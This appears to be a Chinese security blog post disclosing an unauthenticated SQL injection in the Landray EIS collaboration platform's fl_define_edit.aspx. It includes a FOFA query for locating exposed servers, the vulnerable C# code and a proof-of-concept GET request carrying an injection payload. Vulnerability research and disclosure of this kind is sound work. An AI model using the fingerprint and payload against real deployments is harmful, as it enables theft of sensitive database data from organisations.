---
title: "蓝凌智慧协同平台 fl_define_edit.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/landray-eis-fl_define_edit-sqli.html
asset_dir: assets/蓝凌智慧协同平台-fl_define_edit.aspx-sql注入漏洞
---

# 蓝凌智慧协同平台 fl\_define\_edit.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/10 08:20
* 1499浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

软件

SQL

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 简介

蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。 [蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C "蓝凌")EIS智慧协同平台 `fl_define_edit.aspx`存在SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，未授权攻击者可利用该漏洞获取数据库敏感数据。

SQL注入防护

# 影响版本

Landray EIS 2001年至2006年的版本

# fofa语法

`body="/Scripts/jquery.landray.dialog.js" || icon_hash="953405444"`

# 漏洞分析

关键代码如下

```
protected override void Page_Load(object sender, EventArgs e)
    {
      string str1 = this.Request["ID"] == null ? "0" : this.Request["ID"];
      string str2 = this.Request.QueryString["assign_recordid"] == null ? "" : this.Request.QueryString["assign_recordid"];
      Org org = (Org) ((Control) this).Page.Session["Org"];
      this.FIOA_IMG_FOLDER = this.Request.Cookies["FIOA_IMG_FOLDER"].Value;
      this.Tree1.ConfigFile = "conf/fl_define_menu_tree_property.xml";
      this.Tree1.XMLDataFile = org["flowchar"].Equals((object) "SVG流程图") ? "conf/fl_define_menu_tree_svg.xml" : "conf/fl_define_menu_tree_data.xml";
      this.Tree1.PrmData = str1 + (string.op_Equality(str2, "") ? "" : "&assign_recordid=" + str2);
      ((Control) this.Tree1).DataBind();
      if (!string.op_Inequality(str1, "0"))
        return;
      object obj = (object) Landray.DataAccess.DataAccess.GetOneValue("SELECT name FROM OA_FLOW_DEFINE WHERE ID=" + str1).ToString();
      this.form_type = Landray.DataAccess.DataAccess.GetOneValue("SELECT form_type FROM OA_FLOW_DEFINE WHERE ID=" + str1).ToString();
    }
```

直接将 `ID` ==> str1 拼接进sql语句，造成[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "sql注入")漏洞。

# 漏洞复现

```
GET /flow/fl_define_edit.aspx?ID=1%20and%201<CHAR(98)%2BCHAR(99)-- HTTP/1.1
Host: landray.mrxn.net
```

[[![蓝凌智慧协同平台 fl_define_edit.aspx SQL注入漏洞](images/img-001-cf904462dfd7.png)](https://mrxn.net/content/uploadfile/202501/b8f61736427227.png)](https://mrxn.net/content/uploadfile/202501/b8f61736427227.png)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[蓝凌智慧协同平台 fl\_define\_edit.aspx SQL注入漏洞](https://mrxn.net/jswz/landray-eis-fl_define_edit-sqli.html)  
文章链接：<https://mrxn.net/jswz/landray-eis-fl_define_edit-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/landray-eis-fl\_define\_edit-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
